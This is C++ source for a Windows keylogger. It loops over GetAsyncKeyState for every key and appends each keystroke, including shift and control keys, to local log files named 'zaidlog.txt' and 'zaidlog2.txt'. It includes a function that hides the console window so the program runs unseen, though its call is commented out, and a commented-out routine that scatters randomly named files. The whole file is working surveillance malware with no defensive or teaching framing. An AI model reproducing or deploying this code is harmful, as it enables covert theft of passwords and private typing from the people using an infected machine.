#include <iostream>
#include<fstream>
#include <windows.h>
#include <winuser.h>
#include<string>
#include <cstdlib>
#include<ctime>

using namespace std;

void hide()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}

void log()
{
    //char c;
    while(true)
    {
        for(int c=8; c<=222; c++)
        {
            ofstream write("zaidlog.txt",ios::app);
            if(GetAsyncKeyState(c)==-32767)
            {
                if(GetAsyncKeyState(VK_RSHIFT))
                    write<<"<Rshift>";
                else if(GetAsyncKeyState(VK_LSHIFT))
                    write<<"<Lshift>";
                else if(GetAsyncKeyState(VK_LCONTROL))
                    write<<"<Lcontol>";
                else if(GetAsyncKeyState(VK_RCONTROL))
                    write<<"<Rcontrol>";
                else if(GetAsyncKeyState(VK_LMENU))
                    write<<"<Lalt>";
                else if(GetAsyncKeyState(VK_RMENU))
                    write<<"<Ralt>";
                else
                    switch(c)
                    {
                    case 8:
                        write<<"<Backspace>";
                        break;
                    case 9:
                        write<<"<Tab>";
                        break;
                    case 13:
                        write<<"<Enter>\n";
                        break;
                    case 27:
                        write<<"<Esc>";
                        break;
                    case 127:
                        write<<"<Del>";
                        break;
                    default:
                        write<<static_cast<char>(c);
                    }
            }
        }
    }
}

void log2()
{
    while(true)
    {
        for(int key=8; key<=222; key++)
        {
            if(GetAsyncKeyState(key)==-32767)
            {
                ofstream write("zaidlog2.txt",ios::app);
                if(GetAsyncKeyState(VK_LSHIFT)||GetAsyncKeyState(VK_RSHIFT))
                {
                    switch(key)
                    {
                    case 48:
                        write<<")";
                        break;
                    case 49:
                        write<<"!";
                        break;
                    case 50:
                        write<<"@";
                        break;
                    case 51:
                        write<<"#";
                        break;
                    case 52:
                        write<<"$";
                        break;
                    case 53:
                        write<<"%";
                        break;
                    case 54:
                        write<<"^";
                        break;
                    case 55:
                        write<<"&";
                        break;
                    case 56:
                        write<<"*";
                        break;
                    case 57:
                        write<<"(";
                        break;
                    default:
                        break;
                    }
                }
                else
                {
                    switch(key)
                    {
                    case 8:
                        write<<"<Backspace>";
                        break;
                    case 9:
                        write<<"<Tab>";
                        break;
                    case 13:
                        write<<"<Enter>\n";
                        break;
                    case 27:
                        write<<"<Esc>";
                        break;
                    case 127:
                        write<<"<Del>";
                        break;
                    default:
                        write<<static_cast<char>(key);
                    }
                }
            write.close();
            }
        }
    }
}

string finalName(char arr[])
{
    string tmp;
    for(int i=0; i<30; i++)
    {
        tmp+=arr[i];
    }
    return tmp;
}


int main()
{
    //hide();
    log();
    return 0;
}


    /*
    ------>GENERATE FILES!! <----------

    srand(time(0));

        int counter=0;

        int randomNum;
        char names[30];
        string fileName;


        while(counter<10)
        {
         for(int i=0;i<30;i++)
        {
            randomNum=rand()%(122-97+1)+97;
            names[i]=static_cast<char>(randomNum);
        }
        fileName=finalName(names)+".txt";
        cout<<fileName<<endl;
        ofstream output;
        output.open(fileName.c_str());
        output<<"HAHAHAHAH CALL Me "<<counter<<endl;
        output.close();
        counter++;
        }

    */

    /*
                else if(GetAsyncKeyState(VK_RSHIFT))
                    write<<"<Rshift>";
                else if(GetAsyncKeyState(VK_LSHIFT))
                    write<<"<Lshift>";
                else if(GetAsyncKeyState(VK_LCONTROL))
                    write<<"<Lcontol>";
                else if(GetAsyncKeyState(VK_RCONTROL))
                    write<<"<Rcontrol>";
                else if(GetAsyncKeyState(VK_LMENU))
                    write<<"<Lmenu>";
                else if(GetAsyncKeyState(VK_RMENU))
                    write<<"<Rmenu>";
                else
                    write<<"<und>";
    */

